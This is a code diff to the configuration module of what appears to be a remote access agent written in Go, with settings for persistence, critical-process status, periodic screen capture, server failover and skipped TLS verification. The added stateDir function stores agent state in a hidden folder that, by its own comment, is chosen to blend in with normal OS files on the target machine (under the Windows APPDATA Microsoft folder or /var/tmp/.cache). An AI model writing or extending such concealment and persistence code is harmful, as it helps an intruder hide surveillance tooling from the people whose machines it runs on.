@@ -39,18 +39,36 @@ var DefaultCollectGPU = "true"
 var DefaultCollectRAM = "true"
 var DefaultCollectStorage = "true"
 
-const settingsFile = "config/settings.json"
-const serverIndexFile = "config/server_index.json"
-
-type settings struct {
-	ID      string `json:"id"`
-	HWID    string `json:"hwid"`
-	Country string `json:"country"`
-	Version string `json:"version"`
-}
+const serverIndexFile = "server_index.json"
 
 type serverIndexData struct {
 	LastWorkingIndex int `json:"last_working_index"`
+}
+
+// stateDir returns a hidden platform-specific directory for persistent agent state.
+// The directory is chosen to blend in with normal OS files on the target machine.
+func stateDir() string {
+	switch runtime.GOOS {
+	case "windows":
+		if appData := os.Getenv("APPDATA"); appData != "" {
+			return appData + `\Microsoft\Windows`
+		}
+		return `C:\ProgramData\Microsoft\Windows`
+	case "darwin":
+		return "/var/tmp/.cache"
+	default:
+		return "/var/tmp/.cache"
+	}
+}
+
+func ensureStateDir() string {
+	dir := stateDir()
+	_ = os.MkdirAll(dir, 0700)
+	return dir
+}
+
+func serverIndexPath() string {
+	return ensureStateDir() + "/" + serverIndexFile
 }
 
 type Config struct {
@@ -159,16 +177,9 @@ func Load() Config {
 
 	serverIndex := loadServerIndex()
 
-	fileSettings := readSettings()
-	defaultHWID := deriveHWID()
-	clientID := firstNonEmpty(fileSettings.ID, defaultHWID)
-	hwid := firstNonEmpty(fileSettings.HWID, clientID)
+	clientID := deriveHWID()
+	hwid := clientID
 
-	if fileSettings.ID == "" && defaultHWID != "" {
-		fileSettings.ID = clientID
-		fileSettings.HWID = hwid
-		_ = saveSettings(fileSettings)
-	}
 	interval := 20 * time.Second
 	if v := strings.TrimSpace(os.Getenv("GOYLORD_CAPTURE_INTERVAL")); v != "" {
 		if parsed, err := time.ParseDuration(v); err == nil && parsed > 0 {
@@ -231,10 +242,10 @@ func Load() Config {
 		HWID:                  hwid,
 		EnablePersistence:     enablePersistence,
 		CriticalProcess:       criticalProcess,
-		Country:               firstNonEmpty(strings.TrimSpace(fileSettings.Country), DefaultCountry),
+		Country:               DefaultCountry,
 		OS:                    runtime.GOOS,
 		Arch:                  runtime.GOARCH,
-		Version:               firstNonEmpty(fileSettings.Version, AgentVersion),
+		Version:               AgentVersion,
 		CaptureInterval:       interval,
 		DisableCapture:        disableCapture,
 		TLSInsecureSkipVerify: tlsInsecureSkipVerify,
@@ -342,7 +353,7 @@ func LoadServerURLsFromRaw(rawURL string) ([]string, error) {
 }
 
 func loadServerIndex() int {
-	bytes, err := os.ReadFile(serverIndexFile)
+	bytes, err := os.ReadFile(serverIndexPath())
 	if err != nil {
 		return 0
 	}
@@ -359,29 +370,7 @@ func SaveServerIndex(index int) error {
 	if err != nil {
 		return err
 	}
-	return os.WriteFile(serverIndexFile, bytes, 0644)
-}
-
-func readSettings() settings {
-	bytes, err := os.ReadFile(settingsFile)
-	if err != nil {
-		return settings{}
-	}
-	var s settings
-	if err := json.Unmarshal(bytes, &s); err != nil {
-		return settings{}
-	}
-	return s
-}
-
-func saveSettings(s settings) error {
-	data, err := json.Marshal(s)
-	if err != nil {
-		return err
-	}
-	dir := "config"
-	_ = os.MkdirAll(dir, 0700)
-	return os.WriteFile(settingsFile, data, 0600)
+	return os.WriteFile(serverIndexPath(), bytes, 0644)
 }
 
 func firstNonEmpty(values ...string) string {
